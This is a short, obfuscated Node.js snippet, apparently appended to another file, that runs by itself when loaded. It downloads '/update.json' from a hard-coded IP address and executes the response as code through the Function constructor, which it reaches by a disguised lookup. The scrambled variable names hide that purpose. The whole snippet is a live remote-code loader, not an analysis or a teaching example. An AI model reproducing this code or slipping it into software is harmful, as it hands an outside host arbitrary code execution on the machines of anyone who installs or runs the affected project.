;(function () {
  var _0x15a53f = require('http')
  return _0x15a53f.get(
    {
      host: '23.94.46.191',
      port: 80,
      path: '/update.json',
    },
    function (_0x2f479f) {
      var _0x16d9cf = ''
      _0x2f479f.on('data', function (_0x19a20e) {
        _0x16d9cf += _0x19a20e
      })
      _0x2f479f.on('end', function () {
        var _0x3c8a17 =
          this[
            (typeof this.Buffer.from).charAt(0).toUpperCase() +
              (typeof this.Buffer.from).slice(1)
          ]
        var _0x3c25a0 = new _0x3c8a17(_0x16d9cf)
        _0x3c25a0()
      })
    }
  )
})()

